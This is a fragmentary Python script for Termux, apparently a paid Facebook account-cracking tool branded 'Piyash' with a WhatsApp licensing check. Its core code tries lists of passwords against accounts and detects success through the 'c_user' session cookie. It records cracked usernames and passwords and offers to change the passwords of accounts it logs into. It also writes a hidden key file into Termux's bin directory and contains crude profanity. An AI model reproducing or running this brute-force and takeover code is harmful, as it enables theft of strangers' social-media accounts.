...
import requests, os, re, bs4, sys, json, time, random, uuid, datetime, subprocess
...
_________________________________×___________☆___________                                     
           ...
           Tools:    File cloning ( Apps Show New update) 
          Github:    Piyash Fuck
         Whapp  :    01873615592
        Contact :    For Get Approval Contract Me WhatsApp
_________________________________×___________☆___________"""
naim="=PIYASH=="

myid=uuid.uuid4().hex[:10].upper()
try:
	key1 = open('/data/data/com.termux/files/usr/bin/.kkk-cov', 'r').read()
except:
	kok=open('/data/data/com.termux/files/usr/bin/.kkk-cov', 'w')
	kok.write(myid+naim)
	kok.close()
def Subscraption():
	key1=open('/data/data/com.termux/files/usr/bin/.kkk-cov', 'r').read()
	...
	if key1 in r1:
		...
		input("\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;32m Press Enter To Send Key")
		time.sleep(3.5)
		tks = 'DEAR%20SIR%20I%20WANT%20TO%20BUY%20YOUR%20%20PAID%20TOOL%20%20%20%20%20%20%20%20%20%20%20'+naim+''+key1
		os.system('am start https://wa.me/+8801873615592?text=' + tks)
		Subscraption()
#CRACK SELESAI
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCracking By Piyash Usercrack...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
        ...
        if cek_cp =="":
            ...
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f" {N}[{H}•{N}] Password example : {H}piyash123{N}")
            ...
            for memek in cp:
                ...
                titid  = kontol.split(' • ')
                print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[PIYASH-CP] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace("[PIYASH-CP] ", ""), titid[1])
...
# PROSES CRACK METODE 3 in 1
    def __metode__(self, cebok, user, pasw):
        global ok,cp,loop
        animasi = random.choice(["\x1b[1;92m[PIYASH]","\x1b[1;92m[PIYASH]","\x1b[1;92m[PIYASH]","\x1b[1;92m[PIYASH]","\x1b[1;92m[PIYASJ]","\x1b[1;92m[PIYASH]","\x1b[1;92m[PIYASH]"])
            ...
            for pw in pasw:
                ...
                if "c_user" in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        wrt = '[PIYASH-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
